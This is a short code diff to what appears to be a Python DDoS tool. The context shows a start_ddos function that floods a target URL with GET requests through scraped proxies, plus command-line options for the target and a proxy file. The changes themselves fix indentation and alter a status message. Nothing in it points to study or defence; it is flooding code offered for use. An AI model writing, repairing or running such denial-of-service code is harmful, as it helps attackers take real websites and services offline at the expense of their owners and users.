@@ -39,6 +39,7 @@ logo = """
  ║║                                                            ║║
  ║║▒▒                                                          ║║▒▒
 ▒▒▒▒▒▒▒                                                       ▒▒▒▒▒▒ """   
+
 faded_text = fade.fire(logo)
 print(faded_text)
 def check_prox(array, url):
@@ -76,7 +77,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-		   print(color+"| get {-u} | {}_proxy ".format(prox))
+			print(color+"💥 get: {} | proxy ".format(prox))
 	except:
 		pass
 
@@ -84,12 +85,12 @@ def start_ddos(prox, url, headers, proxies, color):
 @click.option('--proxy', '-p', help="File with a proxy")
 @click.option('--url', '-u', help="URL")
 def main(proxy, url):
-    clear()
-	    if url == None:
-	    	url = input("URL: ")
-      	if url[:4] != "http":
-	    	print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
-		    exit()
+	clear()
+	if url == None:
+		url = input("URL: ")
+	if url[:4] != "http":
+		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
+		exit()
 	if proxy == None:
 		while True:
 			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
